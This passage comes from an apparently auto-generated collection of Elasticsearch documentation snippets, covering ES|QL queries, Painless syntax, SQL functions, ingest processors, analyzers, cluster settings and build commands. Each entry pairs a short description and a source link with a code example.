https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/match_operator.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE author:\"Faulkner\"\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Support Matrix\nDESCRIPTION: Mapping table showing field type support for ESQL cartesian_point conversions. Demonstrates that keyword, text, and cartesian_point fields can all be converted to cartesian_point type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_cartesianpoint.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| cartesian_point | cartesian_point |\n| keyword | cartesian_point |\n| text | cartesian_point |\n```\n\n----------------------------------------\n\nTITLE: Configuring Gsub Processor in Elasticsearch\nDESCRIPTION: Example configuration showing how to set up a Gsub processor in an Elasticsearch ingest pipeline. This example replaces dots with dashes in the 'field1' field using regular expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/gsub-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"gsub\": {\n    \"field\": \"field1\",\n    \"pattern\": \"\\\\.\",\n    \"replacement\": \"-\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching a Data Stream using Python\nDESCRIPTION: This Python code snippet demonstrates how to search a data stream using the Elasticsearch Python client. It performs a simple match query on the 'message' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/licenses/ojalgo-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom elasticsearch import Elasticsearch\n\nes = Elasticsearch()\n\nresponse = es.search(\n    index=\"my-data-stream\",\n    body={\n        \"query\": {\n            \"match\": {\n                \"message\": \"test\"\n            }\n        }\n    }\n)\n```\n\n----------------------------------------\n\nTITLE: Configuring Transform Node Role in Elasticsearch\nDESCRIPTION: Static cluster setting to designate a node as a transform node. Transform nodes must be explicitly configured with the transform role and should include remote_cluster_client role for cross-cluster search support.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/transforms-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nnode.roles: [ transform ]\n```\n\n----------------------------------------\n\nTITLE: SUM Function Documentation Structure in Markdown\nDESCRIPTION: The structure of the SUM function documentation in Markdown format, including references to embedded image and included documentation sections.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sum.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `SUM` [esql-sum]\n\n**Syntax**\n\n:::{image} ../../../images/functions/sum.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/sum.md\n:::\n\n:::{include} ../description/sum.md\n:::\n\n:::{include} ../types/sum.md\n:::\n\n:::{include} ../examples/sum.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Azure Application Insights and Monitoring Metrics\nDESCRIPTION: Azure-specific monitoring metrics including application insights, browser performance metrics, CPU usage, memory statistics, and user authentication data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/test/framework/src/main/resources/org/elasticsearch/common/xcontent/support/many_filters.txt#2025-04-22_snippet_4\n\nLANGUAGE: plaintext\nCODE:\n```\nazure.app_insights.end_date\nazure.app_insights.start_date\nazure.app_state.browser_timings_network_duration.avg\nazure.app_state.exceptions_count.sum\nazure.app_state.performance_counters_process_cpu_percentage.avg\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Reverse Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the reverse token filter in an analyze API request. It applies the standard tokenizer and reverse filter to the text 'quick fox jumps'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-reverse-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"reverse\"],\n  \"text\" : \"quick fox jumps\"\n}\n```\n\n----------------------------------------\n\nTITLE: Geographical Hotspot Analysis with Significant Terms in Elasticsearch (JSON)\nDESCRIPTION: Example of using geohash_grid aggregation with significant terms to identify unusual crime types in geographic areas.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"hotspots\": {\n      \"geohash_grid\": {\n        \"field\": \"location\",\n        \"precision\": 5\n      },\n      \"aggs\": {\n        \"significant_crime_types\": {\n          \"significant_terms\": { \"field\": \"crime_type\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Decay Function Basic Structure\nDESCRIPTION: Generic structure for implementing decay functions in Elasticsearch, showing the basic parameters including origin, scale, offset, and decay rate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n\"DECAY_FUNCTION\": { \n    \"FIELD_NAME\": { \n          \"origin\": \"11, 12\",\n          \"scale\": \"2km\",\n          \"offset\": \"0km\",\n          \"decay\": 0.33\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with N-gram Filter in Elasticsearch\nDESCRIPTION: Example of using the analyze API with the ngram filter to generate 1-character and 2-character n-grams from the text 'Quick fox'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-ngram-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [ \"ngram\" ],\n  \"text\": \"Quick fox\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Multivalue Expression Parameter in Markdown\nDESCRIPTION: This snippet defines the 'field' parameter as a multivalue expression using Markdown syntax. It provides a brief description of the parameter's purpose within the context of an ESQL function test case.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_max.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`field`\n:   Multivalue expression.\n```\n\n----------------------------------------\n\nTITLE: Routing to an Index Partition Formula in Elasticsearch\nDESCRIPTION: Formula used when index.routing_partition_size is configured, showing how documents are routed to a subset of shards rather than a single shard.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-routing-field.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nrouting_value = hash(_routing) + hash(_id) % routing_partition_size\nshard_num = (routing_value % num_routing_shards) / routing_factor\n```\n\n----------------------------------------\n\nTITLE: Rounding Down with FLOOR Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the FLOOR function in ESQL to round a decimal number down to the nearest integer. It creates a row with a decimal value and then applies the FLOOR function to round it down.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/floor.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL a=FLOOR(a)\n```\n\n----------------------------------------\n\nTITLE: Example Identifier Variations in Painless\nDESCRIPTION: Demonstrates various valid identifier patterns in Painless, showing different combinations of letters, numbers, and underscores that conform to the identifier grammar rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-identifiers.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\na\nZ\nid\nlist\nlist0\nMAP25\n_map25\nMap_25\n```\n\n----------------------------------------\n\nTITLE: Current Non-Monotonic Metric Example\nDESCRIPTION: This snippet shows how to use the 'current' suffix for non-monotonic metrics (gauges, upDownCounters) such as the number of classes currently loaded by the JVM.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_9\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.classes.loaded.current\"\n```\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.classes.loaded.total\"\n```\n\n----------------------------------------\n\nTITLE: Setting Default GCE Project\nDESCRIPTION: Sets the default Google Cloud project ID for future gcloud commands. This configuration allows you to work with your cloud resources without specifying the project ID in each command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ngcloud config set project es-cloud\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Less Than Or Equal Operator with Numeric Types in Painless\nDESCRIPTION: Shows examples of using the less than or equal operator with different numeric types, including promotion and implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\nboolean x = 5 <= 4; <1>\ndouble y = 6.0;     <2>\nx = 6 <= y;         <3>\n```\n\n----------------------------------------\n\nTITLE: Sorting Across Indices with Different Date Resolutions in Elasticsearch\nDESCRIPTION: Shows how to use the 'numeric_type' option to set a single resolution when sorting across indices with different date field resolutions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST /index_long,index_double/_search\n{\n   \"sort\" : [\n      {\n        \"field\" : {\n            \"numeric_type\" : \"date_nanos\"\n        }\n      }\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Date Math in Elasticsearch Index Names\nDESCRIPTION: Syntax for using date math expressions in index or index alias names. This template allows for dynamic date calculations in index names, making time-series data management more efficient.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_3\n\nLANGUAGE: txt\nCODE:\n```\n<static_name{date_math_expr{date_format|time_zone}}>\n```\n\n----------------------------------------\n\nTITLE: Running SecurityManager Scanner - Shell\nDESCRIPTION: This command is used to run the SecurityManager scanner tool, which analyzes the JDK for SecurityManager method calls and outputs the findings in a structured CSV format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/securitymanager-scanner/README.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew :libs:entitlement:tools:securitymanager-scanner:run\n```\n\n----------------------------------------\n\nTITLE: RoundingMode Enum Definition in Painless\nDESCRIPTION: Defines the RoundingMode enumeration that specifies different rounding behaviors for decimal arithmetic.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.math.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.math.RoundingMode {\n  RoundingMode CEILING\n  RoundingMode DOWN\n  RoundingMode FLOOR\n  RoundingMode HALF_DOWN\n  RoundingMode HALF_EVEN\n  RoundingMode HALF_UP\n  RoundingMode UNNECESSARY\n  RoundingMode UP\n  RoundingMode valueOf(String)\n  RoundingMode[] values()\n}\n```\n\n----------------------------------------\n\nTITLE: Selecting and Renaming Columns in ESQL Query\nDESCRIPTION: ESQL query that selects specific columns from 'employees' table using KEEP clause and renames the 'still_hired' column to 'employed'. This query demonstrates basic column manipulation operations in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/rename.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, still_hired\n| RENAME  still_hired AS employed\n```\n\n----------------------------------------\n\nTITLE: Converting Long Values to Integers in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_INTEGER function to convert long values to integers. It creates a row with long values and applies the TO_INTEGER function to each value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_integer.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW long = [5013792, 2147483647, 501379200000]\n| EVAL int = TO_INTEGER(long)\n```\n\n----------------------------------------\n\nTITLE: Setting Transform Failure Retries in Elasticsearch\nDESCRIPTION: Dynamic setting that controls how many times a transform retries on non-fatal errors before being marked as failed. Valid range is 0-100 with a default of 10.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/transforms-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.transform.num_transform_failure_retries\n```\n\n----------------------------------------\n\nTITLE: Installing the mapper-annotated-text plugin for Elasticsearch\nDESCRIPTION: Command to install the mapper-annotated-text plugin using Elasticsearch's plugin manager. The plugin must be installed on every node in the cluster, with each node requiring a restart after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install mapper-annotated-text\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Function Parameters in Markdown\nDESCRIPTION: This snippet defines the parameters for an ESQL function using Markdown syntax. It specifies the 'field' parameter, describing its input type and potential values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_long.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Setting decompound_mode to 'discard' in Nori Tokenizer\nDESCRIPTION: Example output when decompound_mode is set to 'discard', which decomposes compounds and discards the original form, showing only component parts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\n가곡역 => 가곡, 역\n```\n\n----------------------------------------\n\nTITLE: Fuzzy Completion Suggester Query in Elasticsearch\nDESCRIPTION: Demonstrates how to use fuzzy matching with completion suggesters to handle typos in search queries, with configurable fuzziness parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nPOST music/_search?pretty\n{\n  \"suggest\": {\n    \"song-suggest\": {\n      \"prefix\": \"nor\",\n      \"completion\": {\n        \"field\": \"suggest\",\n        \"fuzzy\": {\n          \"fuzziness\": 2\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HISTOGRAM Function Syntax for Numeric and DateTime Values in Elasticsearch SQL\nDESCRIPTION: Defines the syntax for the HISTOGRAM function in Elasticsearch SQL, supporting both numeric expressions with numeric intervals and date/time expressions with date/time intervals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-grouping.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nHISTOGRAM(\n    numeric_exp,        <1>\n    numeric_interval)   <2>\n\nHISTOGRAM(\n    date_exp,           <3>\n    date_time_interval) <4>\n```\n\n----------------------------------------\n\nTITLE: File Access Entitlements Configuration\nDESCRIPTION: Comprehensive example of configuring file access entitlements with different path types and access modes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\norg.example.module: # or 'ALL-UNNAMED' if the plugin is non-modular\n  - files:\n    - path: \"/absolute/path\"\n      mode: read\n    - relative_path: \"relative/file.txt\"\n      relative_to: data\n      mode: read_write\n    - path_setting: setting.name\n      basedir_if_relative: data\n      mode: read\n```\n\n----------------------------------------\n\nTITLE: Setting Timeout for Elasticsearch Bulk Request\nDESCRIPTION: Method to set the timeout for the bulk request, which defines how long to wait for the request to complete before timing out.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic BulkRequest timeout(TimeValue timeout) {\n    this.timeout = timeout;\n    return this;\n}\n\npublic BulkRequest timeout(String timeout) {\n    return timeout(TimeValue.parseTimeValue(timeout, null, getClass().getSimpleName() + \".timeout\"));\n}\n```\n\n----------------------------------------\n\nTITLE: GROK with Advanced Type Conversion in ESQL\nDESCRIPTION: Demonstrates using type conversion functions with GROK for more complex data type transformations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_15\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z 127.0.0.1 some.email@foo.com 42\"\n| GROK a \"\"\"%{TIMESTAMP_ISO8601:date} %{IP:ip} %{EMAILADDRESS:email} %{NUMBER:num:int}\"\"\"\n| KEEP date, ip, email, num\n| EVAL date = TO_DATETIME(date)\n```\n\n----------------------------------------\n\nTITLE: Configuring Drop Processor in Elasticsearch Ingest Pipeline (JSON)\nDESCRIPTION: This snippet demonstrates how to configure a Drop processor in an Elasticsearch ingest pipeline. The processor is set to drop documents based on a condition where the 'network_name' field equals 'Guest'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/drop-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"drop\": {\n    \"if\" : \"ctx.network_name == 'Guest'\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Regex-based Completion Suggester in Elasticsearch\nDESCRIPTION: Shows how to use regular expressions with completion suggesters to match prefixes based on patterns rather than exact string matches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nPOST music/_search?pretty\n{\n  \"suggest\": {\n    \"song-suggest\": {\n      \"regex\": \"n[ever|i]r\",\n      \"completion\": {\n        \"field\": \"suggest\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Search Benchmark with Gradle\nDESCRIPTION: Gradle command to run a search benchmark on Elasticsearch. It defines client type, benchmark type, target host, index name, search query, and target throughput rates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/benchmark/README.md#2025-04-21_snippet_3\n\nLANGUAGE: gradle\nCODE:\n```\n./gradlew -p client/benchmark run --args ' rest search localhost geonames {\"query\":{\"match_phrase\":{\"name\":\"Sankt Georgen\"}}} 500,1000,1100,1200'\n```\n\n----------------------------------------\n\nTITLE: Enforcing System Properties Immutability\nDESCRIPTION: Requires treating system properties as immutable, preventing direct modification and providing a read-only view alternative.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_15\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Treat system properties as immutable\njava.lang.System#setProperties(java.util.Properties)\njava.lang.System#setProperty(java.lang.String,java.lang.String)\njava.lang.System#clearProperty(java.lang.String)\njava.lang.System#getProperties() @ Use BootstrapInfo.getSystemProperties for a read-only view\n```\n\n----------------------------------------\n\nTITLE: Calculating Sample Variance with VAR_SAMP in SQL\nDESCRIPTION: This SQL snippet shows how to calculate the sample variance of values in the specified field (field_name). The VAR_SAMP function calculates the sample variance and ignores null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_24\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nVAR_SAMP(field_name) <1>\n```\n```\n\n----------------------------------------\n\nTITLE: Defining Stemming Rules for English Words in Elasticsearch\nDESCRIPTION: This snippet defines stemming rules for English words. It shows how to convert 'running' and 'runs' to the base form 'run', and leaves 'stemmer' unchanged.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/src/test/cluster/config/analysis/stemmer_override.txt#2025-04-22_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nrunning, runs => run\n\nstemmer => stemmer\n```\n\n----------------------------------------\n\nTITLE: Usage Metric Example\nDESCRIPTION: This snippet highlights examples using the `usage` suffix, specifically when a size has a known upper limit, indicating a resource utilization scenario.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_5\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.heap.usage\"\n```\n\n----------------------------------------\n\nTITLE: QUERY with Custom Parameters in Elasticsearch SQL\nDESCRIPTION: Example showing how to customize query_string behavior using additional parameters like default_operator and default_field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name, SCORE() FROM library WHERE QUERY('dune god', 'default_operator=and;default_field=name');\n\n    author     |       name        |    SCORE()\n---------------+-------------------+---------------\nFrank Herbert  |God Emperor of Dune|3.6984892\n```\n\n----------------------------------------\n\nTITLE: Type Casting Operations in Elasticsearch SQL\nDESCRIPTION: Examples of type casting combined with other operations like ABS and EXTRACT. Shows grouping and ordering with cast expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CAST(ABS(EXTRACT(YEAR FROM date)) AS BIGINT) FROM test GROUP BY CAST(ABS(EXTRACT(YEAR FROM date)) AS BIGINT) ORDER BY CAST(ABS(EXTRACT(YEAR FROM date)) AS BIGINT) NULLS FIRST;\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nInternalSqlScriptUtils.cast(InternalSqlScriptUtils.abs(InternalSqlScriptUtils.dateTimeExtract(InternalQlScriptUtils.docValue(doc,params.v0),params.v1,params.v2)),params.v3)\n```\n\n----------------------------------------\n\nTITLE: Configuring Filesystem Health Monitoring in Elasticsearch\nDESCRIPTION: Settings for filesystem health monitoring including enabling/disabling checks, setting refresh intervals, and configuring slow path logging thresholds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nmonitor.fs.health.enabled: true\nmonitor.fs.health.refresh_interval: 2m\nmonitor.fs.health.slow_path_logging_threshold: 5s\n```\n\n----------------------------------------\n\nTITLE: Requiring Explicit Host Resolution for Network Operations\nDESCRIPTION: Forbids methods that implicitly resolve hostnames, requiring explicit address resolution instead.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_6\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Resolve hosts explicitly to the address(es) you want with InetAddress.\njava.net.InetSocketAddress#<init>(java.lang.String,int)\njava.net.Socket#<init>(java.lang.String,int)\njava.net.Socket#<init>(java.lang.String,int,java.net.InetAddress,int)\n```\n\n----------------------------------------\n\nTITLE: End-to-End Testing Command for MS SQL Connector\nDESCRIPTION: Shell command to run functional tests for the Microsoft SQL connector, with options to specify test size\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=mssql\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=mssql DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Master Election Settings in Elasticsearch\nDESCRIPTION: Settings that control the master election process including backoff times, election duration and timeout values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.election.back_off_time: 100ms\ncluster.election.duration: 500ms\ncluster.election.initial_timeout: 100ms\ncluster.election.max_timeout: 10s\n```\n\n----------------------------------------\n\nTITLE: Output of Lowercase Tokenizer Processing in Elasticsearch\nDESCRIPTION: Shows the resulting tokens after the lowercase tokenizer processes the input text. All terms are lowercased and separated at non-letter boundaries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lowercase-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ the, quick, brown, foxes, jumped, over, the, lazy, dog, s, bone ]\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search Result with Missing Events in Elasticsearch\nDESCRIPTION: Displays the response format for an EQL sequence search that includes a missing event, indicated by 'missing': true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_7\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"hits\": {\n    \"total\": ...,\n    \"sequences\": [\n      {\n        \"events\": [\n          {\n            \"_index\": \".ds-my-data-stream-2023.07.04-000001\",\n            \"_id\": \"AnpTIYkBrVQ2QEgsWg94\",\n            \"_source\": {\n              \"@timestamp\": \"2099-12-07T11:06:07.000Z\",\n              \"event\": {\n                \"category\": \"process\",\n                \"id\": \"cMyt5SZ2\",\n                \"sequence\": 3\n              },\n              \"process\": {\n                \"pid\": 2012,\n                \"name\": \"cmd.exe\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n              }\n            }\n          },\n          {\n            \"_index\": \"\",\n            \"_id\": \"\",\n            \"_source\": {},\n            \"missing\": true\n          },\n          {\n            \"_index\": \".ds-my-data-stream-2023.07.04-000001\",\n            \"_id\": \"BHpTIYkBrVQ2QEgsWg94\",\n            \"_source\": {\n              \"@timestamp\": \"2099-12-07T11:07:10.000Z\",\n              \"event\": {\n                \"category\": \"file\",\n                \"id\": \"tZ1NWVOs\",\n                \"sequence\": 5\n              },\n              \"process\": {\n                \"pid\": 2012,\n                \"name\": \"regsvr32.exe\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n              },\n              \"file\": {\n                \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n                \"name\": \"scrobj.dll\"\n              }\n            }\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Default position_increment_gap Behavior in Elasticsearch\nDESCRIPTION: This example shows how the default position_increment_gap of 100 affects phrase queries across multiple text field values. It demonstrates that a phrase query doesn't match across values by default, but can match when using sufficient slop.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/position-increment-gap.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"names\": [ \"John Abraham\", \"Lincoln Smith\"]\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match_phrase\": {\n      \"names\": {\n        \"query\": \"Abraham Lincoln\" <1>\n      }\n    }\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match_phrase\": {\n      \"names\": {\n        \"query\": \"Abraham Lincoln\",\n        \"slop\": 101 <2>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample User Dictionary for Nori Tokenizer\nDESCRIPTION: Example of a user dictionary file showing simple nouns and compound noun entries with their decomposition, to be saved as userdict_ko.txt.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_4\n\nLANGUAGE: txt\nCODE:\n```\nc++                 <1>\nC쁠쁠\n세종\n세종시 세종 시        <2>\n```\n\n----------------------------------------\n\nTITLE: Running YAML REST Tests with Gradle\nDESCRIPTION: This shell command uses Gradle to run the YAML REST tests for the custom Elasticsearch plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\ngradle yamlRestTest\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample copyright disclaimer template for employers or institutions to disclaim copyright interest in a GPL-licensed program.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-text-module-NOTICE.txt#2025-04-22_snippet_5\n\nLANGUAGE: plaintext\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Java Appendable Interface Definition\nDESCRIPTION: Defines the Appendable interface with support for appending CharSequence content with offset positions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.Appendable {\n  Appendable append(CharSequence,int,int)\n}\n```\n\n----------------------------------------\n\nTITLE: Output Document After Wildcard Expansion\nDESCRIPTION: Shows the result after expanding all top-level dotted fields with the wildcard option.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_9\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo\" : {\n    \"bar\" : \"value\"\n  },\n  \"baz\" : {\n    \"qux\" : \"value\"\n  